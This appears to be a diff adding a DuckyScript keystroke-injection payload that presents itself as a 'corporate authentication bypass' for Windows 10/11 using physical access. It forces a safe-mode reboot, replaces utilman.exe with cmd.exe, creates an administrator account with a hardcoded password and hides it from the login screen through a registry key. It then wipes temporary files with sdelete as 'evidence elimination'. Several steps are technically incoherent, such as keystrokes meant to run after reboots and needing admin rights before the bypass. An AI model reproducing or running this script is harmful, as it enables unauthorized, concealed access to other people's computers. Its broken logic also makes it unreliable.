@@ -1,0 +1,121 @@
+REM ================================================================
+REM HexScripts - Corporate Authentication Bypass
+REM Windows password elimination through system manipulation
+REM Compatible with Windows 10/11 - Payload Studio ready
+REM ================================================================
+REM 
+REM REQUIRED CONFIGURATION:
+REM - TRIGGER_KEY: Activation key for payload execution
+REM - BACKDOOR_USER: New administrative account name
+REM - BACKDOOR_PASS: New administrative account password
+REM 
+REM OPTIONAL CONFIGURATION:
+REM - ACTIVATION_DELAY: Key press detection delay
+REM - REBOOT_DELAY: System restart timing
+REM - STEALTH_MODE: Enhanced evasion protocols
+REM 
+REM OPERATIONAL NOTES:
+REM - Requires physical access to target system
+REM - Payload activates on specified key combination
+REM - Creates persistent backdoor access
+REM ================================================================
+
+DEFINE #TRIGGER_KEY CAPSLOCK
+DEFINE #BACKDOOR_USER hex_admin
+DEFINE #BACKDOOR_PASS Ch40s_R31gn5!
+DEFINE #ACTIVATION_DELAY 5000
+DEFINE #REBOOT_DELAY 3000
+DEFINE #STEALTH_MODE enabled
+DEFINE #INITIAL_DELAY 2000
+DEFINE #EXECUTION_DELAY 500
+
+REM Wait for system readiness
+DELAY #INITIAL_DELAY
+
+REM Monitor for activation trigger
+REM This payload waits for CAPSLOCK activation before proceeding
+
+REM Phase 1: System preparation and safe mode entry
+CAPSLOCK
+DELAY #ACTIVATION_DELAY
+
+REM Force system into safe mode for privilege escalation
+CTRL ESC
+DELAY #EXECUTION_DELAY
+STRING cmd
+DELAY #EXECUTION_DELAY
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Configure safe mode boot
+STRING bcdedit /set {default} safeboot minimal
+ENTER
+DELAY #EXECUTION_DELAY
+STRING shutdown /r /t 0
+ENTER
+DELAY #REBOOT_DELAY
+
+REM Phase 2: Safe mode exploitation (executes after reboot)
+REM System will boot into safe mode automatically
+
+REM Access system utilities from safe mode
+DELAY 10000
+CTRL ESC
+DELAY #EXECUTION_DELAY
+STRING cmd
+DELAY #EXECUTION_DELAY
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Replace utilman.exe with cmd.exe for backdoor access
+STRING cd C:\Windows\System32
+ENTER
+STRING ren utilman.exe utilman.exe.bak
+ENTER
+STRING copy cmd.exe utilman.exe
+ENTER
+
+REM Restore normal boot mode
+STRING bcdedit /deletevalue {default} safeboot
+ENTER
+STRING shutdown /r /t 0
+ENTER
+
+REM Phase 3: Backdoor activation (executes after normal boot)
+REM Wait for normal Windows boot
+DELAY 15000
+
+REM Activate backdoor through accessibility shortcut
+GUI u
+DELAY 2000
+
+REM Create administrative backdoor account
+STRING net user #BACKDOOR_USER #BACKDOOR_PASS /add
+ENTER
+STRING net localgroup administrators #BACKDOOR_USER /add
+ENTER
+
+REM Disable original utilman functionality and restore
+STRING cd C:\Windows\System32
+ENTER
+STRING del utilman.exe
+ENTER
+STRING ren utilman.exe.bak utilman.exe
+ENTER
+
+REM Enable backdoor account and hide from login screen
+STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v #BACKDOOR_USER /t REG_DWORD /d 0 /f
+ENTER
+
+REM Evidence elimination protocol
+STRING sdelete -p 3 -s -z C:\Windows\Temp
+ENTER
+STRING exit
+ENTER
+
+REM Mission complete - backdoor established
+REM Access system using: Username: #BACKDOOR_USER Password: #BACKDOOR_PASS
